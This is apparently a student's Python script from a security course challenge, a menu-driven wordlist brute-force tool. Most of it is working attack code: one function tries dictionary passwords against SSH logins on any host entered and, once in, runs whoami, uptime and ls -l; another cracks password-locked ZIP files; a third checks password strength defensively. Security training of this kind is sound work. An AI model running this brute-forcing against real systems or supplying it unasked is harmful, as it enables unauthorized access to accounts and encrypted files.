#!/usr/bin/env python3

# Script:                   401 Op Challenge Day 18
# Author:                   Courtney Hans
# Date of latest revision:  10/28/20
# Purpose:                  Automated Brute Force Attack Tool (3 of 3)

# Import libraries
from pexpect import pxssh
import time, getpass, sys
from zipfile import ZipFile

# Declare variables

# Declare functions

def crack_file():
    the_file = input("Enter the file (w/ filepath) you wish to decrypt:  ")
    #the_file = '/home/osboxes/Desktop/lab18princess.zip' # test file
    filepath = input("Enter your dictionary filepath:  ")
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test dictionary filepath
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    success = "no"
    if success == "no":
        while line:
            line = line.rstrip()
            password = line
            print(f"Checking '{password}'...")

            try:
                with ZipFile(the_file) as zf:
                    zf.extractall(pwd=bytes(password,'utf-8'), path='/home/osboxes/Desktop')
                success = "yes"
                print(f"[*] File decrypted with '{password}' - returning to menu. [*]")
                break

            except:
                pass
           
            time.sleep(.5)
            line = file.readline()

        file.close()
    else:
        exit


def iterator():
    host = input("Enter target host:  ")
    username = input("Enter target username:  ")
    filepath = input("Enter your dictionary filepath:  ")
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    success = "no"
    if success == "no":
        while line:
            line = line.rstrip()
            pwd = line
            print(f"Checking '{pwd}'...")
            s = pxssh.pxssh()

            try:
                s.login(host, username, pwd)
                print("\nYou're in!")
                s.sendline('whoami')
                s.prompt()
                print(f"Username: {str(s.before)[12:-5]}  Password: {pwd}") # print everything before the prompt.
                s.sendline('uptime')
                s.prompt()
                print((s.before).decode()) # use .decode() for human-friendly formatting
                s.sendline('ls -l')
                s.prompt()
                print((s.before).decode())
                s.logout()
                success = "yes"
                print("[*] Mission accomplished, returning to menu. [*]")
                break

            except pxssh.ExceptionPxssh as e:
                print("Login attempt failed.")
            
            except KeyboardInterrupt: # graceful exit message if user hits CTRL C
                print("\n\n[*] User requested an interrupt")
                sys.exit()

            time.sleep(.5)
            line = file.readline()

        file.close()
    else:
        exit

def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password:  ")
    usr_filepath = input("Let's check the strength of that password.\nPlease enter a word dictionary filepath:\n")
    #usr_filepath = '/home/osboxes/Desktop/rockyou2.txt' # test filepath
    print(f"Checking password against the words in '{usr_filepath},' just a moment...")
    t1 = time.time()
    file = open(usr_filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    wordlist = []
    while line:
        line = line.rstrip()
        word = line
        wordlist.append(word)
        line = file.readline()
    file.close()
    if usr_password not in wordlist:
        print("Your password is acceptable. Good job.")
        strength = True
    elif usr_password in wordlist:
        print("That password is too common!")
        strength = False
        while strength is False:
            new_password = getpass.getpass(prompt="Please try a different password:  ")
            if new_password in wordlist:
                print("Still too common!")
            elif new_password not in wordlist:
                strength = True
                print("Good job, you got it now.")
    t2 = time.time()
    print("\nTime taken to scan: %.6f" %(t2 - t1))


# Main

if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator for ssh access
2 - Offensive, Dictionary Iterator to decrypt a password-locked file
3 - Defensive, Password Recognized
4 - Exit
    Please enter a number: 
""")
        if mode == "1":
            iterator()
        elif mode == "2":
            crack_file()
        elif mode == "3":
            check_password()
        elif mode == '4':
            break
        else:
            print("Invalid selection, returning to menu...") 

# End